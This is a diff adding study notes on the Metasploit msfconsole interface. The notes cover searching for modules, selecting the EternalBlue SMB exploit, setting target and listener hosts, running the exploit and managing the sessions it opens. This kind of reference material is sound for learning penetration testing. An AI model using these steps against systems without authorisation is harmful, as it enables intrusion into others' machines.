@@ -15,6 +15,72 @@
 
 -- Msfconsole --
 
+What is the MSFconsole?
+MSFconsole is the primary, all-in-one command-line interface for the Metasploit Framework, giving centralized access to nearly all MSF features;
+
+Benefits to Benefits to Using MSFconsole
+• It is the only supported way to access most of the features within Metasploit.
+• Provides a console-based interface to the framework
+• Contains the most features and is the most stable MSF interface
+• Full readline support, tabbing, and command completion
+• Execution of external commands in msfconsole is possible: msf > ping -c 1 192.168.1.100
+
+
+root@hackerbox:~# msfconsole  # Start the Metasploit interactive console (interactive CLI)
+root@hackerbox:~# msfconsole -q  # Start msfconsole quietly (suppress the startup banners)
+root@kali:~# msfconsole -h  # see the other usage available options
+
+msf6 > help  # Show available commands for the current mode (main or module)
+
+search [<options>] [<keywords>:<value>]
+msf6 > search postgresql -s date  # Perform a search for modules. Example: search for "postgresql" and sort ascending by "date" (-s = --sort-ascending)
+msf6 > search smb:server -S name  # --filter (-S) example with a regex filter
+msf6 > search apache -o results.csv  # --output (-o) example: save results as CSV
+msf6 > search ms17_010 -I  # --ignore (-I) example: ignore on ambiguous same-name match
+
+msf6 > use 12  # Select a module by its index number from the search results
+msf6 > use exploit/windows/smb/ms17_010_eternalblue  # Select a module by its full module path
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) > info  # Show detailed information about the selected module (or module path)
+msf6 exploit(windows/smb/ms17_010_eternalblue) > options  # List configuration options for the currently selected module (required vs optional)
+
+msf6 > show exploits
+msf6 > show payloads
+msf6 exploit(...) > show options
+# List items of a type (exploits, payloads, auxiliary, post, plugins, encoders, nops, options, ...)
+
+msf6 exploit(...) > set RHOSTS 192.168.1.50
+msf6 exploit(...) > set LHOST 10.0.0.5
+# Set/change the value of a module option
+
+msf6 exploit(...) > get RHOSTS  # Display the current value of an option
+msf6 exploit(...) > unset RHOSTS  # Clear the value of a module option
+msf6 exploit(...) > advanced  # Display advanced options for the currently active module
+
+msf6 > history  # Show command history
+
+msf6 > sessions  # List active sessions (Meterpreter/Shell)
+msf6 > sessions -i 1  # Interact with session ID 1
+msf6 > sessions -K  # Kill all sessions
+
+msf6 exploit(...) > exploit  # Execute the configured exploit (alternative: run)
+msf6 exploit(...) > run  # Execute the configured module/exploit (synonym in many modules)
+
+msf6 exploit(...) > back  # Exit the currently selected module and return to the previous prompt
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 -- Exploits --
